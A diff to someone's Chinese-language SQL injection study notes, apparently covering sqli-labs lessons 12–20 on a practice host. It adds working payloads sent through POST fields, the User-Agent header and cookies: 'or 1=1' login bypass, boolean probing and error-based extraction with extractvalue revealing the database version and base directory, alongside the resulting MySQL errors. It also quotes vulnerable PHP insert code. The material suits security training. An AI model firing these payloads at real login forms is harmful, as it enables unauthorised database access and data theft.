@@ -63,8 +63,17 @@
 				post data-->uname=admin' or 1=1 #&passwd=1&submit=Submit	
 				post data-->1admin' union select 1,database() #
 			http://xiaoxiaoran.com/sqli/Less-12/
-				post data-->uname=admin ")or 1=1 -- +&passwd=1&submit=Submit	
-			
+				post data-->uname=admin ")or 1=1 -- +&passwd=1&submit=Submit
+			http://xiaoxiaoran.com/sqli/Less-13/
+				post data-->uname=admin'&passwd=admin&submit=Submit
+					MySQL server version for the right syntax to use near ''admin'') and password=('') LIMIT 0,1' at line 1
+				post data-->uname=admin')or 1=1#&passwd=1&submit=Submit
+				post data-->uname=admin')and left(database(),1)='s'#&passwd=1&submit=Submit
+			http://xiaoxiaoran.com/sqli/Less-14/
+				post data-->uname=admin"&passwd=1&submit=Submit
+					MySQL server version for the right syntax to use near '1" LIMIT 0,1' at line 1
+				post data-->uname=admin" and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&passwd=1&submit=Submit
+					XPATH syntax error: '~5.5.53~'
 基于如何处理输入的 SQL 查询（数据类型） 
 	基于字符串 
 	数字或整数为基础的 
@@ -72,7 +81,13 @@
 	★一阶注射 	
 	★二阶注射 
 基于注入点的位置上的 
+	
 	▲通过用户输入的表单域的注射。 
+		user agent
+		$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
+			-->'and extractvalue(1,con t(0x7e,(select @@version),0x7e)) and '1'='1
+		http://xiaoxiaoran.com/sqli/Less-20/
+			cookies-->uname=admin1'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#
 	▲通过 cookie 注射。 
 	▲通过服务器变量注射。(基于头部信息的注射）
 		
